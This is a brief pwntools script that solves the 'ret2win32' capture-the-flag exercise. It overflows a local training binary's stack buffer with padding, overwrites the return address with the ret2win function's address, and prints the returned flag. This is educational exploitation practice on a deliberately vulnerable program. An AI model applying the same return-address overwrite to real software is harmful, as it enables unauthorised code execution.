from pwn import *


p = ELF("./ret2win32")
r = process("./ret2win32")

ret2winaddr = p.symbols["ret2win"]

r.recv()

pld = "A"*40
pld += "BBBB"
pld += p32(ret2winaddr)

r.send(pld)

r.recv()
log.success("Flag: " + r.recv())
